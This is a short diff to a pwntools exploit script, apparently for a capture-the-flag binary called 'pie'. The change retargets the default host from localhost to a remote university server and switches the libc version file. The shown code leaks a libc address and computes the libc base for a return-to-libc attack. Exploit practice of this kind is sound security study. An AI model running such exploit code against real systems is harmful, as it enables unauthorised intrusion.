@@ -3,7 +3,7 @@ from pwn import *
 
 exe = context.binary = ELF(args.EXE or './pie')
 
-host = args.HOST or '127.0.0.1'
+host = args.HOST or 'netconf.num.edu.mn'
 port = int(args.PORT or 10000)
 
 def start_local(argv=[], *a, **kw):
@@ -65,8 +65,8 @@ leaked= io.recv(6).strip().ljust(8, b"\x00")
 leaked = u64(leaked)
 print("printf",hex(leaked))
 
-# libc = ELF("./libc6_2.35-0ubuntu3.4_amd64.so",checksec=False)
-libc = ELF("./libc6_2.35-0ubuntu3.5_amd64.so",checksec=False)
+libc = ELF("./libc6_2.35-0ubuntu3.4_amd64.so",checksec=False)
+# libc = ELF("./libc6_2.35-0ubuntu3.5_amd64.so",checksec=False)
 # libc = ELF("./libc.so.6",checksec=False)
 # libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
 libc_base=leaked-libc.symbols.puts
